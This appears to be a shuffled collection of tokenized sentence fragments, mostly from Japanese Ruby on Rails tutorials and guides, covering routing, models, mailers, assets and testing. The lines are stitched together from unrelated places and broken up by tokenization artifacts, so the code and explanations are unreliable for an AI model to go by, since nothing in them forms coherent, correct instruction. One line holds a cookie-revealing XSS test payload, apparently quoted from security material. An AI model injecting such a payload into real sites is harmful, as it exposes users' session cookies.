▁ その後 、 各 ユーザーに 50 のマイクロポスト ▁( ページネーション が 切り 替 わ る 30 を 超 え る 数 ) ▁ を作成し 、 Faker ▁gem の 便利な \ href { http :// fa k er ▖ ruby for ge ▖ org / rdoc / classes / Faker / Lorem ▖ html } { Lorem ▖ sentence } \ text tt { } メソッドを使って 各 マイクロポストの サンプル コンテンツ を生成します
▁この 本 質 的な 特 性 の ため 、 ブラウザの ある ページ から 別の ページ に移動し たときに 、 ユーザーの ID を保持し ておく 手 段 が \ href { http :// en ▖ w ikipedia ▖ org / wiki / Hyper text _ Transfer _ Protocol # HTTP _ session _ state } { HTTP プロトコル 内 「 には 」 } まったく ありません ▟ ユーザーログイン の 必要な Web アプリケーションでは 、\ href { http :// en ▖ w ikipedia ▖ org / wiki / Session _ ( computer _ science ) }{\ emph { セッション } } と呼ばれる 半 永続的 な 接続 を コンピュータ 間 ▁( ユーザーの パ ソ コ ン の Web ブラウザ と Rails サーバー など ) ▁ に 別 途 設定 します ▟ セッション は HTTP プロトコル と 階層 が 異なる ▁( 上の 階層 にある ) ▁ ので 、 HTTP の 特 性 とは 別 に ▁( 若 干 影 響 は 受 け る もの の ) ▁ 接続 を 確 保 できます ▟ ( 訳 注 : ▁ 昔 は 離 れ た 相手 と 一 手 ずつ 葉 書 を やりとり して の ん び り と 将 棋 を指す 酔狂 な 人 が とき ど き いました が 、 将 棋 の 対 戦 を ひとつ の セッション と 考え れば 、 その 下 の 郵 便 システム は HTTP 同様 ス テ ート レ ス であり 、 対 戦 者 同士 が 盤 の状態 を保持し ていれば 、 郵 便 システム や 郵 便 配 達 夫 が 対 戦 の 進 行 や 内容 に 一 切 か か わ ら なくても ゲ ーム は 成 立 します ) 。
▁$ ▁bundle ▁exec ▁rake ▁test
▁The ▁results ▁are ▁show n ▁in ▁Figure ▁\ ref { fig : demo _ micropost _ model } ▖
▁ コミット を ひとつ に まとめ ること で 、 安 定 版 ブランチ に 新しい 変更を バックポート しやすくなり 、 よく ない コミット を 取り 消 しやすくなり 、 Git の 履 歴 を 多少 なり とも 追 い や す く なります 。
▁たとえば 、 サインイン 失敗 をテストする には 、 以下のような シナリオ を作成します 。
▁ ブラウザの アドレス バー に ` http :// localhost : 3 000 ` と 入力 して ' Go ' を 押 す と 、 ブラウザ ▁( つまり クライアント ) ▁ は サーバー に対して リクエストを 1 つ 送信 します 。
▁ これはリスト \ ref { code : feed _ item _ partial } で使用されていました 。
▁def ▁ welcome _ email ( user )
▁リスト \ ref { code : user _ login _ test _ valid _ information } では 、 ログイン 用 リンク が表示され なく な った ことも 確認し ています ▟ この チェック は 、 ログイン パス のリンク が ページに \ emph { ない } かどうか で 判 定 しています 。
▁` pluralize ` メソッドは 、 レシーバ を 「 複数形 」 に したものを 返します 。
▁ 保 護 された ページ にアクセス した ときの ページのモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / signin _ page _ protected _ mockup _ bootstrap - full ▖ png }{( 拡大 )}
▁class ▁Compute r ▁< ▁ActiveRecord :: Base
▁resources ▁: account s
▁duplicate ▖ push ▁' another - string '
▁次の 単純な Active ▁Record クラスを 例 に 取 って みましょう 。
▁Action ▁Mailer を使用する メールの 受 信 と 解 析 は 、 メール送信 に 比 べ て や や 複 雑 です 。
▁scope ▁' admin ', ▁as : ▁' admin ' ▁do
▁` unscope ` を使用して 特定の 条件 を 取り除く ことができます 。
▁config ▖ assets ▖ version ▁= ▁' 1 ▖ 0 '
▁このメソッドは 、\ k ode { it } と \ k ode { it s } メソッドを 以下のように 使う ことで テスト できます 。
▁=> ▁ Word
▁しかし ながら 、 道 具 の使い方 を 覚え ること が 職 人 にとって 当 然 の 心 得 である ように 、 使用する ツール について 学ぶ ことは 大 切 な ことです ▟ 払 った 努 力 に 見 合 う 見 返 り は 必ず あります 。
▁ デモアプリケーション のユーザー \ k ode { index } アクションを 整 理 した もの 。
▁ 1235551234 ▖ to _ s (: phone )
▁リスト \ ref { code : static _ page _ routes } の例 に従い 、 ユーザー登録 URL 用に \ k ode { get ▁ ’ / signup ’} の ルール を追加します ▁( リスト \ ref { code : signup _ route }) 。
▁しかし 、 パブリックな API の ルール は 若 干 異なります 。
▁#### ▁ テキスト を出力する
▁\ k ode { heroku } コマンド に 以下の 引数 を与える だけで 、 正しい アドレス で ブラウザ が 起動 します 。
▁ さ て 、` app / controllers / articles _ controller ▖ rb ` を再度 開 い てみると 、 残 念 な ことに まだ ` create ` アクション で `@ article ▖ save ` の結果 を利用する ようになってい ません 。
▁Active ▁Support は 細 か く 分割 され 、 必要な 拡張機能 だけ が 読み込まれる ようになっています ▟ また 、 関連する 拡張機能 ( 場合によっては すべての 拡張機能 ) も 同時に 読み込む の に 便利な エントリ ポイント もあります 。
▁上 を実行し た 出力結果 の中に 、 以下のような 警 告 が含まれている はずです 。
▁\ k ode { name } 属性 に バリデーション に対するテスト
▁これで Users リソース の 概 略 について の 説明 が 終わり ましたが 、 ここで \ ref { sec : mvc } で紹介した ▁ MVC ▁( Model - View - Controller ▁= ▁ モデル - ビュー - コントローラ ) ▁ パターン の観点 から この リソース を 考 察 してみましょう 。
▁{0} 図 2▖1 6 {/0} ▁{1} User モデルと Micropost モデルの 継 承 階層 {/1}
▁` en code _ json ` フック の サポート
▁ 原 理 的に は 、\ k ode { rake ▁db : reset } コマンド 1 つ で これら 2 つの タスク を実行する ことが も できます が 、 最新の Rails だと うまく 動かない ので この ようにしています 。
▁@ article ▁= ▁Article ▖ new
▁\ k ode { update } アクション のテスト も 、\ k ode { create } アクション 用の テスト と だいたい 同じです 。
▁ 関連付け を行なう のは 、 それによって コード 内で 一般的 に 行われ る 操作を は る か に 簡単に できる からです 。
▁te }╼╼ ▁\ subsection { Heroku コマンド } ╼ ▁\ label { sec : heroku _ commands }╼╼
▁上のコードでは 、 リクエスト の種類 に応じて 、 続 く 行 の中から \ emph { 1 つだけ } が 実行される ことに注意してください 。
▁( このとき 、 リスト \ ref { code : errors _ partial } と同様に ▁\ k ode { if ▁@ user ▖ microposts ▖ any ?}\ ▁ を使って 、 ユーザーのマイクロポスト が 1 つ も ない場合 には 空の リスト を 表示 させ ていない 点 にも 注 目 してください ▟)
▁ 以上 のように することで 、 ユーザーが ブラウザで ` / books ` にアクセスすると 、 Rails は自動的に ` app / views / books / index ▖ html ▖ erb ` ビュー を使用して レスポンス を 出力 し 、 その 結果 「 Book s ▁are ▁ com ing ▁soon !」 という文字 が 画面 に 表示されます 。
▁ 文字列 の 末 尾
▁リスト \ ref { code : custom _ home _ page } と リスト \ ref { code : custom _ help _ page } の結果 をそれぞれ 図 \ ref { fig : custom _ home _ page } と 図 \ ref { fig : custom _ help _ page } に示します 。
▁ Flash の キーを 取り出す と 常に 文字列 になります 。
▁render ▁' edit '
▁production 環境で 実際に メール送信 する方法 については \ ref { sec : activation _ email _ in _ production } で説明します 。
▁> > ▁p ▖ valid ?
▁javascript _ url ▁" common " ▁# ▁=> ▁ http :// www ▖ example ▖ com / assets / common ▖ js
▁# ▁< id ▁type =" integer "> 44 04 </ id >
▁CDN で 扱 う アセットを 一 部 だけ に 限 って お き たい場合 、 アセット ヘルパー の カスタム `: host ` オプション を使用して ` config ▖ action _ controller ▖ asset _ host ` の値 セット を上書き することもできます 。
▁def ▁ prepare
▁t ▖ string ▁: order _ number
▁( 注 : ▁console 、 server 、 migrate の 3 つの コマンドで は 、 デフォルト 以外の 環境 を指定する 方法 が それぞれ 異 な っ ており 、 混 乱 を 招 く 可能性があります ▟ このため 、 3 つの 場合 の すべて を 本 コ ラ ム で 説明しました ▟)
▁ 連続 ドット は 省略 を表し ているので 、 他の コード と 一 緒 に コピー しないよう ご注意ください
▁( HTML では スペース や タブ は 無視 される ので 、 インデント は あって も なくても 大丈夫 ですが 、 インデント がある 方が HTML の データ構造 を 理解 しやすくなり ます ) 。
▁Active ▁Record で サポート される コールバック の種類 の詳細については 、 Rails ▁Guides の 「\ href { http :// guides ▖ rubyonrails ▖ org / active _ record _ callback s ▖ html } { コールバック について } ▁( 英語 )」 を参照してください 。
▁<%= ▁image _ tag ▁" icon s / delete ▖ g if " ▁%>
▁この 関連付けを 図 で 表 した もの が 図 \ ref { fig : micropost _ user _ association } です 。
▁ mod ▖ const _ set ( const _ name , ▁value )
▁N ▁= ▁ Module ▖ new
▁ Cloud 9 に 新しい ワークスペース を作成する 。
▁ この章 の例 全体 に わ た って 、 これまで よりも 複雑な データモデル を使用しています ▟ ここ で学んだ データモデル は 、 今後 自分 用の Web アプリケーションを開発する ときに 必ず 役に立ちます 。
▁record ▖ errors [: name ] ▁<< ▁' 名前 は X で始まる 必要があります '
▁Basic ▁HTTP ▁ Authentication ▁C hallenge ]( images / getting _ started / c hallenge ▖ png )
▁\ k ode { flash } 変数 に 代入 した メッセージ は 、 リダイレクト した 直後 の ページ で 表示 できるようになります 。
▁### ▁` try `
▁" visual E ffect "▖ underscore ▁# ▁=> ▁" visual _ e ffect "
▁今度は 、 ビュー などの ▁" テンプレート " ▁ が 見当たらない という エラーメッセージ が表示されます 。
▁t ▖ belongs _ to ▁: customer
▁[ ci ▁skip ] ▁ は 「 ドキュメント のみ の 変更 」 以外 では 使用できません ▟ コードの 変更 には 絶 対 使用 しないでください 。
▁### ▁ 警 告
▁< script > document ▖ write ( document ▖ cookie ) ; </ script >
▁(\ k ode { shared } ディレクトリ は {1} {2} 第 7 章 {/2}{/1} で 作成します ) 。
▁これで テストが ▁\ passing ▁ になるはずです 。
▁| ▁` LineItem ` ▁| ▁` line _ items ` ▁|
▁Git ▁( という より バージョン管理 ) ▁ は それ だけで 大きな テーマ なので 、 すべて を 説明 しようとすると 軽 く 一 冊 の 本 を 超 え てしまいます ▟ 本書 では 簡単に 言 及 する にとどめ ますが 、 幸 い ネ ッ ト 上に は 無 償 で 利用できる リソース が あ ふ れ ています ▟ その中で も 特に 「\ href { http :// git - s cm ▖ com / book }{\ emph { Pro ▁Git } }」 S co tt ▁C ha con ▁( A press , ▁200 9 ) ▁ を お勧め いた します ▁( 訳 注 : ▁ Pro ▁Git には 素晴らしい 日本語 版 があります : ▁ http :// git - s cm ▖ com / book / ja / ▁ ) 。
▁ これはリスト \ ref { code : layout _ links _ test _ signup _ full _ title _ helper } で使用されていました 。
▁上の メソッド を使用すれば 、\ k ode { user ▖ following } にある 各 要素 の \ k ode { id } を呼び出し 、 フォローしているユーザー の id の配列 を構成する ことができます 。
▁たとえば 、` style ▖ css ` という アセット は 、` app / assets / stylesheets / style ▖ css ` ではなく ` app / assets / stylesheets / [ エンジン 名 ] / style ▖ css ` に置かれ る必要があります 。
▁さらに 、 この章 で作成した すべての HTML が 適切に 表示される ようになった はずです ▟ 最終的な フォーム を 図 \ ref { fig : home _ with _ form } に 、 投 稿 エラーが表示され た フォーム を 図 \ ref { fig : home _ form _ errors } に示します 。
▁{0} 図 5 ▖ 7 {/0} ▁{1} Home ページに footer を追加する {/1}
▁この 演習 を まだ や って い ない場合は 、 リスト \ ref { code : gravatar _ option } に従って Users ヘルパー ファイルを 更新 してから先に進 んで ください 。
▁この 変更 に 備えて 、 テスト 実行 順 を明示的に指定 する ` active _ support ▖ test _ order ` という 新しい 設定 オプション が Rails ▁4 ▖ 2 に 導 入 されました 。
▁ パーシャル の使用 方法 の 1 つ は 、 パーシャル を 一種の サブ ル ー チ ン のように み な す ことです ▟ 詳細な 表示 内容 を パーシャル 化 して ビュー から 追 い 出 し 、 コードを 読みやすく します 。
▁# ▁ 現在 ログイン 中の ユーザー を返す ▁( いる場合 )
▁以下は この ワーム に関する 技術 的な 解説 です 。
▁ テストの ドメイン ホスト を設定する
▁<%= ▁link _ to ▁' A d ▁details ', ▁[ @ magazine , ▁@ ad ] ▁%>
▁ ルーター は 、 ビューで これらの パス や URL を直接 ハ ー ド コード すること を避けるために パス や URL を生成する こともできます 。
▁ 顧客 名 ( Customer ) から LineItem を `@ customer ▖ orders ▖ line _ items ` のように 直接 取り出す 機 会 が 頻繁に ある のであれば 、 Customer と Order の関連付け を行なう 時に LineItem を あ ら か じ め include しておくこと で 無駄な クエリ を 減 ら し 、 効率 を 高 め ることができます 。
▁この 行 に対応する URL 、 アクション 、 名前付きルート は {0}{1} 表 7 ▖ 1 {/1}{/0} のようになります
▁unless ▁@ number ▖ nil ?
▁\ k ode { app / assets } : ▁ 現在の アプリケーション 固有の アセット
▁ 出力結果 は 、 コンピュータ システム によって 微 妙 に 異なる ので 、 本チュートリアル の 出力結果 と 実際の 出力 が 正確に 一致する とは限りません ▟ しかし 、 こうした 細 か い 出力結果 の 差 異 が 問題 になる ことは ないので 、 それ ほど 気にする必要はありません 。
▁@ book ▁= ▁ Book ▖ find _ by ( id : ▁params [: id ])
▁Rails ▁4▖1 から Rails ▁4 ▖ 2 へのアップグレード
▁Rails ▁ エンジン 入 門
▁app / assets / stylesheets /
▁ 有効な メール フォーマット をテストする ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁clients ▁= ▁Client ▖ includes (: address )▖ limit (10)
▁#### ▁` find `
▁* ▁Active ▁Support が提供する 拡張機能 一覧
▁ 正規表現 \ k ode { VALID \_ EMAIL \_ REGEX } は \ emph { 定数 } です ▟ 大文字 で始まる 名前 は Ruby では 定数 を 意味 します 。
▁\ emph { Rails チュートリアル } では 、 ソフトウェア 開発 の 現 場 で 即座に 通 用 する ベ スト プ ラ ク テ ィ ス を学ぶ ために 、 新しい Rails プロジェクト を 作成した 直後 に Git ▁(\ ref { sec : version _ control }) ▁ を使った バージョン管理 を行います 。
▁x ▁ += ▁1
▁ ヒ ン ズ ー 教 では 、 ア バ ター は 人 間 や 動 物 の 形 を と って 神 が 顕 現 した もの と 考 えられ ています 。
▁` collection << ` メソッドは 、 結合テーブル 上で レコード を作成し 、 それによって 1 つ または 複数の オブジェクトを コレクション に追加します 。
▁ 記憶ダイジェスト が \ k ode { nil } になるので 、 bcrypt ライブラリ 内部で 例外が発生します 。
▁ これはリスト \ ref { code : user _ create _ action } で使用されていました 。
▁ 作成する テストは 「 パッチ 」 の 形式 に しても ら え ると ベ スト です ▟ 詳 しく は 「 Rails のコード に 貢献 する 」 で 後 述 します 。
▁ これはリスト \ ref { code : micropost _ model _ image } で使用されていました 。
▁User モデル が でき あ が った ので 、 いよいよ ユーザー登録 機能 を追加しましょう 。
▁ただし Web からの ユーザー登録 はまだ できない ▁({0}{1} 第 7 章 {/1}{/0} で 完成させます ) ▁ ので 、 今回は Rails コンソール を使って ユーザーを 手動で 作成する ことにしましょう 。
▁customer ▖ orders ▁# ▁ データベースから orders を取得する
▁このコードは 、\ ref { sec : mvc _ in _ action } や \ ref { sec : mvc _ in _ action } でも 説明したように 、\ k ode {@ name } および \ k ode {@ email } ▁\ emph { インスタンス変数 } について 、 取り出し ( get ) ▁ と 割り当て ( set ) ▁ を行う ▁" ゲ ッ ター " ▁ と ▁" セッター " ▁という メソッドを それぞれ 作成します 。
▁ 既に このような ルーティング を使用している場合 は 、 以下の 変更 が必要です 。
▁| test / | Uni t テスト 、 フィクスチャ などの テスト 関連 ファイルを ここに 置きます 。
▁Users リソース のとき は 専 用の \ k ode { resources } メソッドを使用して RESTful な ルーティング を自動的に フル セット で 利用 できるように しました ▁( リスト \ ref { code : users _ resource }) ▁ が 、 Session リソース では フル セット は い ら ないので 、「 名前付き ルーティング 」 だけ を使用します ▟ この 名前付き ルーティング では 、\ text tt { GET } リクエスト や \ text tt { POST } リクエストを \ k ode { login } ルーティング で 、\ text tt { DELETE } リクエストを \ k ode { logout } ルーティング で 扱 います 。
▁< td > <%= ▁link _ to ▁" Re mov e ", ▁book , ▁method : ▁: delete , ▁data : ▁ { ▁confirm : ▁" A re ▁you ▁sure ? "
▁次に 、 以下のように \ k ode { it } メソッドの 変 種 を使用する ことにより 、 コード と 記 述 を 1 行 に 収 め ます 。
▁これらの パラメータ は 、 受け取った コントローラ内の アクション で 参 照 可能 になっ ており 、 これ を使用して 特定の タスク を実行します 。
▁</ ol >
▁( たとえば Heroku の PostgreSQL では サポート されています が 、 開発 用の SQLite では サポート されていません ) 。
▁ 論理値 ? ▁?
▁| ▁GET ▁| ▁ / kategorien / ne u ▁| ▁categories # new ▁| ▁new _ category _ path ▁|
▁* ▁` config ▖ action _ mailer ▖ logger ` は 、 Log 4 r の インターフェイス または デフォルトの Ruby ▁ Logger クラス に従う ロガー を 引数として 取り ます ▟ この ロガー は 、 Action ▁Mailer からの 情報を ログ出力 するために使用されます 。
▁* ▁` Rack :: Lock ` は 、 アプリケーションを ミ ュ ー テ ッ ク ス で ラ ッ プ し 、1 度 に 1 つの スレッド で しか 呼び出され ない ようにします 。
▁@ orders ▁= ▁@ customer ▖ orders
▁ ビルトイン のバリデーション ヘルパーは 、 デフォルトでは 保存 時に 実行されます ▟ これは レコード の作成 時 および 更新 時の どちらの 場合にも 行われます 。
▁self を省略した 結果を リスト \ ref { code : user _ reverse _ relationships } に示します 。
▁リスト \ ref { code : bitbucket _ add _ push } の最初の コマンドは 、 Bitbucket を リポジトリ の \ emph { origin } として Git の 設定ファイル に追加する ためのものです ▟ 次の コマンドで は 、 ローカル の リポジトリを リモート の origin に プッシュ します
▁2 番目の 問題 の 対策 としては 、 記憶トークン をそのまま データベースに保存 する の ではなく 、 記憶トークン の ハッシュ 値 を保存する ようにします ▟ これは 、\ ref { sec : adding _ a _ secure _ password } で 生の パスワード をデータベースに保存する 代わりに パスワード の ダイジェスト を 保存 した の と同じ コ ン セ プ ト です 。
▁* ▁`: as ` 関連付け と併用する ことはできません 。
▁* ▁` add _ built in _ route `: ▁ アプリケーションが development 環境で 動作 している場合 、` rails / info / properties ` への ルーティング を アプリケーションの ルーティング に追加します 。
▁ 本 章で 開発 する 認 証 ▁( authentication ) ▁ システム によって 、 サイト を カスタマイズ して 現在のユーザー の 「 ログイン ステータス 」 と 「 ID 」 に 基 づ いた 認可 ▁( authorization ) ▁ モデル を実装する ことができます 。
▁Rails を含む 多くの Web フレームワーク は 、 HTTP の各 操作を 発 展 させた \ emph { REST ▁ アーキテクチャ } の 影 響 を受け ています ▟ {1} {2} 第 2 章 {/2}{/1} でも 簡単に触れ ましたが 、 {3} {2} 第 7 章 {/2} {/3} では 、 より 深 い 内容 について 学びます 。
▁\ k ode { store _ location } メソッドを 、 サインイン した ユーザーの before _ filter に追加する 。
▁ どう しても `: id ` 内で ドット を使用したい場合 は 、 デフォルト 設定 を上書き する 制限 を与え ます ▟ たとえば ` id : ▁ / [ ^ \ / ] + / ` と すると 、 スラッシュ 以外の すべての 文字 が 使用できます 。
▁この 新しい カラム を追加する には 、 エンジンの ディレクトリ で 以下の コマンドを実行 する必要があります 。
▁# ▁=> ▁true
▁ユーザーの ビュー と アクション が 定義された ので 、 URL ▁\ href { http :// localhost :3000/ users /1}{/ users /1 } ▁ は 完全に 動作する ようになりました ▁( 図 \ ref { fig : user _ show _ rails }) 。
▁TIP : ▁` with _ options ` は メソッドを レシーバ に 転 送 している ので 、 呼び出し を ネスト することもできます 。
▁i ▁= ▁It em ▖ lock (" LO C K ▁ IN ▁S HA RE ▁M O D E ")▖ find (1)
▁ ハッシュの `: locale ` キー は 、 単 に その テンプレート が 何 語 向 け な のか を 示 しています 。
▁### ▁` sum `
▁これらの アサーション から は ` ActionController :: Routing Error ` の 代りに ` Assertion ` が発生する ようになりました 。
▁WARNING : ▁` has _ and _ belongs _ to _ many ` 関連付け で使用する 結合テーブル に このような 余分な カラム を追加する ことは お勧め できません 。
▁ 引数として カラム名 の リスト を与える と 、 指定した カラム の値 の配列 を 、 対応する データ 型 で 返します 。
▁さらに 、 置き換え られる オブジェクトは 、 これは 外部キー が変更され た ことによって すべて 自動的に 保存されます 。
▁さらに 、 テーブル に含まれている 各 行 の カラム を 、 作成した モデルのインスタンス の 属性 に マッピング します 。
▁t ▖ string ▁: part _ number
▁options [: counter _ cache ]
▁ 結 局 テストは い つ 行 えば よい のか
▁| ` perform _ deliveries ` | Mail の メッセージ に ` deliver ` メソッドを 実行 したときに 実際に メール 配信 を行なう かどうかを指定します 。
▁ アセットパイプライン を使用する ために 以下の 変更 が必要です 。
▁== ▁Create Article s : ▁migrat ing ▁== ================ ================ ================
▁# ▁Active ▁Job を使用して 後で メール送信 したい場合は # deliver _ later を使用
▁[ RedCloth ]( http :// r ed c lo th ▖ org / ) は Ruby 用に 開発 された マークアップ 言語 の 一 種 ですが 、 気 を付け て 使用 しない と XSS に対して も 脆 弱 になります 。
▁Bitbucket の 利用 開 始 は 簡単です 。
▁ コントローラ を新規作成する ための \ k ode { rails } の スクリプト は \ k ode { rails ▁generate ▁controller ▁Controller Name ▁< action ▁name ▁( 省略 可 ) > } ▟ 訳 注 : ▁ コントローラ 名 は キャメルケース 、 アクション 名 は ス ネ ー ク ケース にする 。
▁ 私 た ち の セキュリティ モデル では 、 一 般 ユーザーに はこの 削除リンク を表示し ない ようにします 。
▁` config ▖ assets ▖ logger ` を false に設定する と 、 アセット の ログ出力 が オフ になります
▁` render ` メソッドが `@ article ▖ comments ` コレクション に含まれる 要素を 1 つ 1 つ 列 挙 するときに 、 各 コメント を パーシャル と同じ 名前 の ローカル変数 に 自動的に 割り当て ます ▟ この場合は ` comment ` という ローカル変数 が使用され 、 これは パーシャル で の表示 に 使用されます 。
▁Rails の すべての ディレクトリ を 一覧 できる テキストエディタ または IDE が 使用できる と 非常に 便利です ▟ テキストエディタ や IDE の 細 か な 使用 法 は 残念ながら それぞれ 異なります が 、 どの ツール を使って も Rails アプリケーションの ディレクトリ を開く ことができます ▟ Unix 系 の システム では 、 ドット \ k ode { ▖ } で カレント ディレクトリ を 表現 できる ので 、 コマンドライン 上で 以下を実行して Rails アプリケーションの 現在の ディレクトリ を開き 、 使用する エディタ を呼び出し てみてください 。
▁app ▖ config ▖ assets ▖ precompile ▁ += ▁% w ( admin ▖ css ▁admin ▖ js )
▁`: controller ` や `: action ` を 除 き 、 どんな もの でも ` params ` の一部 に含め て アクションに 渡す ことができます 。
▁Rails には 、 ルーティング を調べる 機能 と テスト する 機能 が 備わっています 。
▁以上で 、 ブログ に 記事 や コメント を 自由に 追加 して 、 それら を 正しい 場所に 表示 できるようになりました 。
▁デフォルトは ` config / locales /* ▖ { yml , rb } ` です 。
▁ 実行 した結果 の Micropost モデルの 構造 は 図 \ ref { fig : micropost _ model } のようになります 。
▁ まったく 馬鹿 げ ています 。
▁ 好 み に応じて 、 更新 した アプリケーションを Heroku に 展開 しても構いません 。
▁上 に示した とおり 、 Rails の 他の ジェネレータ 同様の方法で メイラー を 生成 できます 。
▁< body >
▁ これはリスト \ ref { code : edit _ tests _ signed _ in } で使用されていました 。
▁@ article ▁= ▁Article ▖ find ( params [: article _ id ])
▁ 再び ` config / routes ▖ rb ` ファイル を開き 、 以下のように 変更 してください 。
▁render ▁" books / edit ▖ html ▖ erb "
▁ モデル を作成して バリデーション を追加し 、 Web の フォーム 経由で その モデル が 作成 できるように なったら 、 その モデル で バリデーション が 失敗した ときに エラーメッセージ を表示し た く なります 。
▁### ▁` has _ many ` 関連付け
▁それでは マイグレーション を実行して blorgh _ comments テーブル を生成し てみましょう 。
▁ プロジェクト を開く
▁最初の タスク は 、 ユーザー登録フォーム の表示 が 失敗 しない かどうか 、 そして ページ を表示し 、 ボタン を 押 し 、 無効な データを 送信する 動作を シ ミ ュ レ ート することです ▟ ボタン を 代わりに 押 す には \ k ode { click _ button } を使用します 。
▁**` Rack :: MethodOverride ` **
▁\ k ode { picture } 属性 を追加した マイクロポストの データモデル
▁以上で 、 静的ページ の アクションと ビュー を作成し ました ▟ 次は 、 ページ の内容を 反 映 した タイトル を 持ち 、 ページ ごとに 内容 が 変 化 する 、\ emph { 少しだけ } 動的な ページ を作成し てみましょう 。
▁` C a p file ` に 以下 を追加します 。
▁{0} 図 7 ▖ 15 {/0} ▁{1} ユーザー登録 失敗 {/1}
▁7 ▖ ▖ 11 ) ▁# ▁=> ▁true
▁たとえば 、 ダブルクォート を使って 文字列 のインスタンス を作成し ましたが 、 これは 文字列 の オブジェクトを 暗 黙 で 作成する \ emph { リテラル コンストラクタ } です 。
▁self を省略した 結果を リスト \ ref { code : signed _ in _ user _ index } に示します 。
▁たとえば 、` app / assets `、` lib / assets ` 、 または ` vendor / assets ` の下に ある ` javascripts ` の下に ある JavaScript ファイルに リンク したい場合は 以下のように します 。
▁\ k ode { destroy } アクションを 改造 し 、 管理者 が 自分自身 を 削除 できない ようにしてください 。
▁リスト { p 0} の {2} edit {/2} アクション に対応する {2} update {/2} アクション を定義する には 、 4 通り の場合 分 け に対応する 必要があります : ▁ パスワード再設定の 期 限 が 切 れ ている 場合 、 更新 に成功した場合 、 更新 が 失敗した場合 ▁( パスワード が正しく ない など ) 、 更新 が 失敗した場合 ▁( 一見 更新 が成功した ように 見え る が パスワードが 2 つ とも 空欄 ) ▁ です 。
▁ メイラー ▁( mailer ) ▁ のテスト ケース では 、 テスト する クラス の名前 から テスト 対象 の メイラー を取得する の に ` constantize ` メソッドを使用します 。
▁` application ▖ rb ` の場合 。
▁end
▁` title ize ` メソッドは 、 レシーバの 語 の 1 文字 目 を 大文字 に します 。
▁\ k ode { center } クラス に \ k ode { text - al ig n : ▁ center } プロパティ を 関連付け ています 。
▁assemblies ▖ where (▖▖▖)
▁ 変更 内容 を 説明します ▟ Rails の すべての モデル は 初期化 時に 属性 ( フィールド ) を与え ら れ 、 それら は データベース カラム に 自動的に 対応 付け られます 。
▁# ▁この ブロック は コンソール で 実行される とき しか 呼び出され ない
▁ モデルの 継 承 関係 と同様に 、 Users コントローラ も Microposts コントローラ も 最終的に は \ k ode { ActionController :: Base } を継承し ており 、 モデルオブジェクト の 操作 、 イン バ ウ ンド HTTP ▁request の フィルタ 、 ビューを HTML として 出力する などの 多 彩 な 機能を 実行 できる ようになっています ▟ ▁S ince ▁all ▁Rails ▁controllers ▁inherit ▁from ▁\ k ode { Application Controller }, ▁rules ▁defined ▁in ▁the ▁Application ▁controller ▁automatically ▁apply ▁to ▁every ▁action ▁in ▁the ▁application ▖
▁最後に もうひとつ 小 技 を お 教 え します 。
▁#### ▁` at ( position ) `
▁class ▁Application ▁< ▁Rails :: Application
▁{0} 図 10 ▖8{/0}{1} 別 ユーザ の プロファイル と マイクロポスト ▁(\ href { http :// localhost :3000/ users /5}{/ users /5}) ▟\ href { http :// railstutorial ▖ org / images / figures / other _ profile _ with _ microposts _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁この 統合テスト は 、 そのまま バグ の ドキュメント にも なり 、 今後 の 回 帰 バグ 発生 を 防止 する 効 能 もあります ▟ さらに 、 今後 この 統合テスト を 土台 として 、 より 本格的な 統合テスト を作成するとき にも 便利です 。
▁上の マイグレーション コードは データベース に依存し ていない ことにご注目ください ▟ MySQL 、 PostgreSQL 、 O ra c le など 多くの データベース に対して 実行 できます 。
▁{0} 図 5 ▖4{/0}{1} スペース や 共通 スタイル を追加した 結果 ▟\ href { http :// railstutorial ▖ org / images / figures / sample _ app _ universal _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁ ファイル / ディレクトリ 構造 が すべての Rails アプリ で 標準 化 されている おかげで 、 他の 開発者 の 書いた Rails のコード が 読みやすく なります ▟ これは Web フレームワーク を導入する 大きな メ リ ッ ト です 。
▁ この節 のコード で 、 Micropost モデルと インターフェイス が完成しました ▟ すべての テストが パスするはずです 。
▁上 によって 、` admin _ photos _ path ` と ` admin _ account s _ path ` などの ルーティング が生成されます ▟ これらは ` / admin / photos ` と ` / admin / account s ` に それぞれ 割り当て られます 。
▁たとえば 、 エンジン で しか 使用 しない 管理 機能を 作成した と しましょう 。
▁Client ▖ pluck (: id , ▁: name )
▁M D 5 は コンパイル される ファイル の内容 を元に プリコンパイル 中に 生成 され 、 ファイル名 に 挿入され て デ ィ ス ク に 保存されます 。
▁{0} 図 7 ▖ 14 {/0} ▁{1} ユーザー登録 が 失敗した とき のモックアップ ▟ { {/1}
▁\ ref { sec : render ing _ microposts } のユーザー マイクロポストの テンプレート 作成 作業 の 成 果 は 、 何 とも 拍 子 抜 け でした 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / remove _ method ▖ rb ` です 。
▁このコードは \ k ode { update } アクション でも 同様 でした 。
▁\ ref { sec : a _ user _ class } では 、 オブジェクトの 属性 を設定する ための \ emph { 初期化 ハッシュ ▁( hash ) ▁ } を 引数に 取 るように 、 User クラス の例 ▁( user _ example ▖ rb ) ▁ を 設計 しました ▟ この 設計 は 、 同様の方法で オブジェクトを 初期化 する Active ▁Record の 設計 に基づいて います 。
▁ ミドルウェアスタック に ミドルウェア を追加した り 、 削除 したり 、 変更 したり するには ` application ▖ rb ` も しく は 環境 ご と の ` environments / < environment > ▖ rb ` ファイル 内で ` config ▖ middleware ` を い じ ります 。
▁Guard を 終 了 するには Ctrl - D キーを 押 します ▟ Guard に 他の マッチ ャ ー を追加する 方法 については 、 リスト \ ref { code : guard file } の例 、\ href { https :// github ▖ com / guard / guard } { Guard ▁README }、\ href { https :// github ▖ com / guard / guard / wiki } { Guard ▁ wiki } を参照してください 。
▁validates ▁: title , ▁presence : ▁true ,
▁when ▁' Re view er '
▁# ▁=> ▁ActiveRecord :: RecordInvalid : ▁Validation ▁failed : ▁ Order s ▁count ▁can ' t ▁be ▁blank
▁たとえば 、` view able _ by ` カラム と ` locked ` カラム だけ を取り出し たい場合は 以下のように します 。
▁ を テーマ
▁ { p 0} の {2} rails ▁new {/2} コマンド と \ ref { sec : the _ hello _ application } の {2} bundle ▁install {/2} コマンドを実行 した ことにより 、 実際に 動 か す こと の できる アプリケーション が作成され ました 。
